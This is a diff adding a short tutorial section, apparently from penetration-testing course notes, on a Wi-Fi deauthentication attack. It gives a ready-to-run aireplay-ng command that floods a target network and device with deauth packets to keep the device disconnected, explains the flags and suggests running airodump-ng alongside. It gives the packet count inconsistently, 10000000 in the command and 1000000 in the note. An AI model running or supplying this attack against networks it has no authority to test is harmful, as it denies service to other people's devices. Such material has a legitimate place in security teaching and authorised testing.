@@ -1,0 +1,18 @@
+SECTION 5.17
+
+DEAUTHENTICATION ATTACK
+*Disconnect any device from any network
+*We will use aireplay-ng for this
+
+aireplay-ng --deauth 10000000 -a <target network's mac address> -c <target device's mac address> wlan0
+
+*deauth- gives an indication that we want to run a deauthentication attack
+*1000000- A large number of deauhtentication packets that will be sent to the router and the client so that client stays disconnected
+
+
+
+
+*before running this command it is suggested to have a airodump-ng running in a second terminal window for the target network
+*After running this command the client wont be able to reconnect unless you do cntrl+c in the terminal
+
+
